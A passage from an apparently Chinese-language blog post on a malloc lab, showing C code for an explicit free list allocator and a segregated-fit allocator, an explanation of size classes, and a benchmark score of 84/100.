class="comment">//调整，块大小至少要2*DISZE</span></span><br><span class="line">        asize = <span class="number">2</span>*(DSIZE);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        asize = (DSIZE)*((size+(DSIZE)+(DSIZE<span class="number">-1</span>)) / (DSIZE));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//搜索适合的块</span></span><br><span class="line">    <span class="keyword">if</span>((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        place(bp,asize);</span><br><span class="line">        DEBUG_OUT;</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//扩展大小，asize和CHUNKSIZE的最大值</span></span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span>((bp = extend_heap(extendsize/DSIZE)) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp, asize);</span><br><span class="line">    DEBUG_OUT;</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *bp;</span><br><span class="line">    <span class="keyword">for</span>(bp = GET(empty_list); bp != <span class="literal">NULL</span>; bp = GET(NEXT_NODE(bp))) &#123;</span><br><span class="line">        <span class="keyword">if</span>(GET_SIZE(HDRP(bp)) &gt;= asize) &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp,<span class="keyword">size_t</span> asize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    fix_linklist(bp); <span class="comment">//remove from list</span></span><br><span class="line">    <span class="comment">//剩余大于最小块大小</span></span><br><span class="line">    <span class="keyword">if</span>((csize-asize)&gt;=(<span class="number">2</span>*DSIZE)) &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        </span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize-asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize-asize, <span class="number">0</span>));</span><br><span class="line">        PUT(NEXT_NODE(bp), <span class="number">0</span>);</span><br><span class="line">        PUT(PREV_NODE(bp), <span class="number">0</span>);</span><br><span class="line">        coalesce(bp);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">//否则，形成内部碎片</span></span><br><span class="line">        PUT(HDRP(bp),PACK(csize,<span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(csize,<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="realloc-1"><a href="#realloc-1" class="headerlink" title="realloc"></a>realloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> oldsize; <span class="keyword">void</span> *newptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) &#123;</span><br><span class="line">        mm_free(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ptr == <span class="literal">NULL</span>) <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line">    </span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line">    <span class="comment">/* If realloc() fails the original block is left untouched  */</span></span><br><span class="line">    <span class="keyword">if</span>(!newptr) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* Copy the old data. */</span></span><br><span class="line">    oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">if</span>(size &lt; oldsize) oldsize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, ptr, oldsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free the old block. */</span></span><br><span class="line">    mm_free(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后跑分结果其实也不是不能看哈（捂脸</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   89%    5694  0.000305 18700</span><br><span class="line"> 1       yes   92%    5848  0.000199 29431</span><br><span class="line"> 2       yes   94%    6648  0.000399 16657</span><br><span class="line"> 3       yes   96%    5380  0.000268 20097</span><br><span class="line"> 4       yes   99%   14400  0.000129111715</span><br><span class="line"> 5       yes   87%    4800  0.000569  8436</span><br><span class="line"> 6       yes   85%    4800  0.000526  9119</span><br><span class="line"> 7       yes   55%    6000  0.000911  6583</span><br><span class="line"> 8       yes   51%    7200  0.000306 23506</span><br><span class="line"> 9       yes   26%   14401  0.075776   190</span><br><span class="line">10       yes   34%   14401  0.002762  5213</span><br><span class="line">Total          73%   89572  0.082151  1090</span><br><span class="line"></span><br><span class="line">Perf index = 44 (util) + 40 (thru) = 84/100</span><br></pre></td></tr></table></figure>
<h2 id="分离空闲链表"><a href="#分离空闲链表" class="headerlink" title="分离空闲链表"></a>分离空闲链表</h2><p>一个使用单向空闲块链表的分配器需要与空闲块数量呈线性关系的时间来分配块。而我们可以用<strong>分离存储</strong>（segregated storage）来减少分配时间，即维护多个空闲链表，其中每个链表中的块有大致相等的大小。一般的思路是将所有可能的块大小分成一些等价类，也叫做<strong>大小类</strong>（size class）。有很多种方式来定义大小类，例如可以根据 2 的幕来划分块大小：{1},{2},{3,4},{5∼8},⋯ ,{1025∼2048},{4097∼∞}</p>
<p>分配器维护着一个空闲链表数组，每个大小类一个空闲链表，按照大小的升序排列。当分配器需要一个大小为 n 的块时，它就搜索相应的空闲链表。如果不能找到合适的块与之匹配，它就搜索下一个链表，以此类推。</p>
<p>有关动态内存分配的文献描述了几十种分离存储方法，主要的区别在于它们如何定义大小类，何时进行合并，何时向操作系统请求额外的堆内存，是否允许分割，等等。基本的方法有<strong>简单分离存储</strong>（simple segregated storage）和<strong>分离适配</strong>（segregated fit）以下用分离适配作为举例。</p>
<p>分离适配方法分配器维护着一个空闲链表的数组。每个空闲链表是和一个大小类相关联的，并且被组织成某种类型的显式或隐式链表。每个链表包含潜在的大小不同的块，这些块的大小是大小类的成员。有许多种不同的分离适配分配器。</p>
<p>为了分配一个块，必须确定请求的大小类，并且对适当的空闲链表做首次适配，査找一个合适的块。如果找到了一个，那么就（可选地）分割它，并将剩余的部分插入到适当的空闲链表中。如果找不到合适的块，那么就搜索下一个更大的大小类的空闲链表。如此重复，直到找到一个合适的块。如果空闲链表中没有合适的块，那么就向操作系统请求额外的堆内存，从这个新的堆内存中分配出一个块，将剩余部分放置在适当的大小类中。要释放一个块，我们执行合并，并将结果放置到相应的空闲链表中。</p>
<p>分离适配方法是一种常见的选择，C 标准库中提供的 GNU malloc 包就是釆用的这种方法，因为这种方法既快速，对内存的使用也很有效率。搜索时间减少了，因为搜索被限制在堆的某个部分，而不是整个堆。内存利用率得到了改善，因为有一个有趣的事实：对分离空闲链表的简单的首次适配搜索，其内存利用率近似于对整个堆的最佳适配搜索的内存利用率。</p>
<h3 id="init-2"><a href="#init-2" class="headerlink" title="init"></a>init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( (heap_list = mem_sbrk(<span class="number">14</span> * WSIZE)) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    PUT(heap_list, <span class="number">0</span>); <span class="comment">// &lt;= 8</span></span><br><span class="line">    PUT(heap_list + (<span class="number">1</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &lt;= 16</span></span><br><span class="line">    PUT(heap_list + (<span class="number">2</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &lt;= 32</span></span><br><span class="line">    PUT(heap_list + (<span class="number">3</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &lt;= 64</span></span><br><span class="line">    PUT(heap_list + (<span class="number">4</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &lt;= 128</span></span><br><span class="line">    PUT(heap_list + (<span class="number">5</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &lt;= 256</span></span><br><span class="line">    PUT(heap_list + (<span class="number">6</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &lt;= 512</span></span><br><span class="line">    PUT(heap_list + (<span class="number">7</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &lt;= 2048</span></span><br><span class="line">    PUT(heap_list + (<span class="number">8</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &lt;= 4096</span></span><br><span class="line">    PUT(heap_list + (<span class="number">9</span> * WSIZE), <span class="number">0</span>); <span class="comment">// &gt; 4096</span></span><br><span class="line">    PUT(heap_list + (<span class="number">10</span> * WSIZE), <span class="number">0</span>);</span><br><span class="line">    PUT(heap_list + (<span class="number">11</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>)); 	<span class="comment">//序言块头</span></span><br><span class="line">    PUT(heap_list + (<span class="number">12</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>)); 	<span class="comment">//序言块尾</span></span><br><span class="line">    PUT(heap_list + (<span class="number">13</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>)); 		<span class="comment">//结尾块</span></span><br><span class="line"></span><br><span class="line">    block_list = heap_list;</span><br><span class="line">    heap_list += (<span class="number">12</span> * WSIZE); <span class="comment">//移动到尾部，之后方便插入</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE / DSIZE) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//alignment</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * DSIZE : words * DSIZE;</span><br><span class="line">    <span class="keyword">if</span>( (bp = mem_sbrk(size)) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(NEXT_NODE(bp), <span class="literal">NULL</span>);</span><br><span class="line">    PUT(PREV_NODE(bp), <span class="literal">NULL</span>);</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ptr == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//改变头尾节点，即释放</span></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(NEXT_NODE(ptr), <span class="number">0</span>);</span><br><span class="line">    PUT(PREV_NODE(ptr), <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//尝试合并</span></span><br><span class="line">    coalesce(ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>&#123;</span><br><span class="line">    <span class="comment">//获取前后分配状态</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(prev_alloc &amp;&amp; next_alloc) &#123; <span class="comment">//都分配</span></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)&#123; <span class="comment">//合并后块</span></span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        fix_linklist(NEXT_BLKP(bp));</span><br><span class="line">        PUT(HDRP(bp), PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size,<span class="number">0</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)&#123; <span class="comment">//合并前块</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        fix_linklist(PREV_BLKP(bp));</span><br><span class="line">        PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123; <span class="comment">//前后中一起合并</span></span><br><span class="line">        size +=GET_SIZE(FTRP(NEXT_BLKP(bp)))+ GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        fix_linklist(PREV_BLKP(bp));</span><br><span class="line">        fix_linklist(NEXT_BLKP(bp));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    insert_to_sizelist(bp);</span><br><span class="line">    DEBUG_OUT;</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insert_to_sizelist</span><span class="params">(<span class="keyword">char</span>* bp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = find_fit_class(GET_SIZE(HDRP(bp)));</span><br><span class="line">    <span class="keyword">char</span>* prev = start;</span><br><span class="line">    <span class="keyword">char</span>* next = GET(start);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//按照使用的size排序，插入对应</span></span><br><span class="line">    <span class="keyword">while</span>(next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(GET_SIZE(HDRP(next)) &gt;= GET_SIZE(HDRP(bp))) <span class="keyword">break</span>;</span><br><span class="line">        prev = next;</span><br><span class="line">        next = GET(NEXT_NODE(next));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(prev == start) &#123; <span class="comment">//头结点插入</span></span><br><span class="line">        PUT(start,bp);</span><br><span class="line">        PUT(NEXT_NODE(bp),next);</span><br><span class="line">        PUT(PREV_NODE(bp),<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(next != <span class="literal">NULL</span>) PUT(PREV_NODE(next), bp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        PUT(NEXT_NODE(prev), bp);</span><br><span class="line">        PUT(PREV_NODE(bp), prev);</span><br><span class="line">        PUT(NEXT_NODE(bp), next);</span><br><span class="line">        <span class="keyword">if</span>(next != <span class="literal">NULL</span>) PUT(PREV_NODE(next), bp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_linklist</span><span class="params">(<span class="keyword">char</span>* bp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = find_fit_class(GET_SIZE(HDRP(bp)));</span><br><span class="line">    <span class="keyword">char</span>* prev = GET(PREV_NODE(bp));</span><br><span class="line">    <span class="keyword">char</span>* next = GET(NEXT_NODE(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(prev == <span class="literal">NULL</span>) &#123; <span class="comment">//不用修复前驱</span></span><br><span class="line">        <span class="keyword">if</span>(next != <span class="literal">NULL</span>) PUT(PREV_NODE(next), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(start, next);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//跳过当前节点</span></span><br><span class="line">        <span class="keyword">if</span>(next != <span class="literal">NULL</span>) PUT(PREV_NODE(next), prev);</span><br><span class="line">        PUT(NEXT_NODE(prev), next); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PUT(PREV_NODE(bp), <span class="literal">NULL</span>);</span><br><span class="line">    PUT(NEXT_NODE(bp), <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="title">find_fit_class</span><span class="params">(<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(size &lt;= <span class="number">8</span>) i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(size &lt;= <span class="number">16</span>) i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(size &lt;= <span class="number">32</span>) i = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(size &lt;= <span class="number">64</span>) i = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(size &lt;= <span class="number">128</span>) i = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(size &lt;= <span class="number">256</span>) i = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(size &lt;= <span class="number">512</span>) i = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(size &lt;= <span class="number">2048</span>) i = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(size &lt;= <span class="number">4096</span>) i = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">else</span> i = <span class="number">9</span>;</span><br><span class="line">    <span class="comment">/*find the index of bin which will put this block */</span></span><br><span class="line">    <span class="keyword">return</span> block_list + (i * WSIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize; <span class="comment">//调整块大小后的大小</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize; <span class="comment">//如果找不到，申请新堆的大小</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size &lt;= DSIZE)&#123; <span class="comment">//调整，块大小至少要2*DISZE</span></span><br><span class="line">        asize = <span class="number">2</span>*(DSIZE);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        asize = (DSIZE)*((size+(DSIZE)+(DSIZE<span class="number">-1</span>)) / (DSIZE));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//搜索适合的块</span></span><br><span class="line">    <span class="keyword">if</span>((bp = find_fit(asize))!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">        place(bp,asize);</span><br><span class="line">        DEBUG_OUT;</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//扩展大小，asize和CHUNKSIZE的最大值</span></span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span>((bp = extend_heap(extendsize/DSIZE)) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp, asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = find_fit_class(asize);</span><br><span class="line">    <span class="keyword">for</span>(; start != heap_list - (<span class="number">2</span> * WSIZE); start += WSIZE) &#123;</span><br><span class="line">        <span class="keyword">char</span>* cur = GET(start);</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(GET_SIZE(HDRP(cur)) &gt;= asize) <span class="keyword">return</span> cur;</span><br><span class="line">            cur = GET(NEXT_NODE(cur));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp,<span class="keyword">size_t</span> asize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    fix_linklist(bp); <span class="comment">//remove from list</span></span><br><span class="line">    <span class="comment">//剩余大于最小块大小</span></span><br><span class="line">    <span class="keyword">if</span>((csize-asize)&gt;=(<span class="number">2</span>*DSIZE))&#123;</span><br><span class="line">        PUT(HDRP(bp),PACK(asize,<span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(asize,<span class="number">1</span>));</span><br><span class="line">        </span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp),PACK(csize-asize,<span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(csize-asize,<span class="number">0</span>));</span><br><span class="line">        PUT(NEXT_NODE(bp),<span class="number">0</span>);</span><br><span class="line">        PUT(PREV_NODE(bp),<span class="number">0</span>);</span><br><span class="line">        coalesce(bp);</span><br><span class="line">    &#125;<span 